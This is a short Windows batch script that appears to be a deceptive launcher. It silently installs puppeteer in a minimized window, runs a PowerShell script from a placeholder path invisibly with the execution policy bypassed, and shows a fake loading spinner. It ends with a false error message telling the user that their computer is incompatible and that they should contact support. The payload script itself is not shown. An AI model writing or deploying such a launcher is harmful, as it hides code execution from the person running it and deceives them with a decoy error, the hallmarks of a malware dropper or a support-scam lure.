@echo off
setlocal

:: Hide output and install puppeteer if not installed
IF NOT EXIST "node_modules" (
    echo Installing dependencies...
    start /min cmd /c "npm install puppeteer"
)

:: Path to Node.js
set "NODE_PATH=C:\Program Files\nodejs\node.exe"

:: Run the PowerShell script invisibly
start /min "" powershell -ExecutionPolicy Bypass -File "C:\path\to\install-node.ps1"

:: Optional loading animation (basic)
call :loading
exit

:loading
setlocal EnableDelayedExpansion
set "spinner=|/-\"
for /l %%x in (1,1,10) do (
    for %%c in (!spinner!) do (
        <nul set /p=Loading %%c
        ping -n 2 localhost >nul
        <nul set /p=
    )
)
echo.
echo ERROR: Your computer does not work with this program.
echo Please contact support for further assistance.
pause
exit /b
